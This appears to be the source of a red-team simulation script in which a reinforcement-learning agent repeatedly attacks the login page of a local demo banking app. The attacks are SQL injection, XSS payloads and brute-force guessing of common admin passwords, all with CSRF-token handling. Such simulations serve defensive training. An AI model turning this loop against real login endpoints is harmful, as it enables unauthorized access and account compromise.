import requests
import random
import time
import re
from agents.red_agent import RedAgent
from omegabank.core.system_state import system_state # Read-only access for "Recon" if we wanted, but sticking to black-box

BASE_URL = "http://localhost:5000"

def get_csrf_token(session, url):
    try:
        response = session.get(url, timeout=2)
        match = re.search(r'name="csrf_token" value="([^"]+)"', response.text)
        if match:
            return match.group(1)
    except: pass
    return None

def run_adversary():
    print("Starting AI-Driven Adversary...")
    agent = RedAgent()

    # State: Simplified view of the world
    # "OPEN" (Normal), "BLOCKED" (Last req failed), "SLOW" (High latency)
    current_state = "OPEN"

    session = requests.Session()

    while True:
        action = agent.get_action(current_state)

        # Execute Attack
        start_time = time.time()
        success = False
        status_code = 0

        try:
            if action == "SQL_INJECTION":
                url = f"{BASE_URL}/auth/login"
                token = get_csrf_token(session, url)
                if token:
                    r = session.post(url, data={
                        'username': "' OR '1'='1",
                        'password': 'pwd',
                        'csrf_token': token
                    })
                    status_code = r.status_code
                    if status_code == 200 and "Invalid credentials" not in r.text: success = True # False positive possible, but good for RL

            elif action == "XSS_SPRAY":
                url = f"{BASE_URL}/auth/login"
                token = get_csrf_token(session, url)
                if token:
                    r = session.post(url, data={
                        'username': "<script>alert(1)</script>",
                        'password': 'pwd',
                        'csrf_token': token
                    })
                    status_code = r.status_code

            elif action == "BRUTE_FORCE":
                 # Rapid fire
                 url = f"{BASE_URL}/auth/login"
                 for pwd in ["123", "password", "admin"]:
                     token = get_csrf_token(session, url)
                     if token:
                         r = session.post(url, data={'username': 'admin', 'password': pwd, 'csrf_token': token})
                         status_code = r.status_code

            elif action == "STEALTH_PROBE":
                # Just get the page, verify headers
                r = session.get(f"{BASE_URL}/")
                status_code = r.status_code
                if status_code == 200: success = True

            elif action == "IDLE":
                time.sleep(2)
                success = True
                status_code = 200

        except Exception as e:
            status_code = 0 # Network error

        # Calculate Reward
        reward = 0
        next_state = "OPEN"

        if status_code == 200:
            reward = 10 if action != "IDLE" else 1
        elif status_code == 403:
            reward = -20 # Blocked
            next_state = "BLOCKED"
        elif status_code == 429:
            reward = -10 # Rate Limited
            next_state = "BLOCKED"
        elif status_code == 0:
             next_state = "BLOCKED" # Down?

        if action == "SQL_INJECTION" and success: reward += 50

        # Latency check
        if (time.time() - start_time) > 2.0:
            next_state = "SLOW"

        # Learn
        agent.learn(current_state, action, reward, next_state)
        current_state = next_state

        # Update Global State for Dashboard Visibility
        # (In a real scenario, Red wouldn't have write access to system_state, but this is a sim)
        # We'll use a side channel (file) or just let the dashboard guess.
        # Ideally, we update a shared dict if in the same memory space.
        # Since `launch_fintech_sim.py` uses threading, we can access `system_state` singleton?
        # No, `sim/adversary.py` is imported. So yes, singleton works if in same process.

        try:
             # Hack to update global singleton for visualization
             from omegabank.core.system_state import system_state
             system_state.ai_red_action = action
        except: pass

        time.sleep(random.uniform(0.5, 2.0))

if __name__ == "__main__":
    run_adversary()
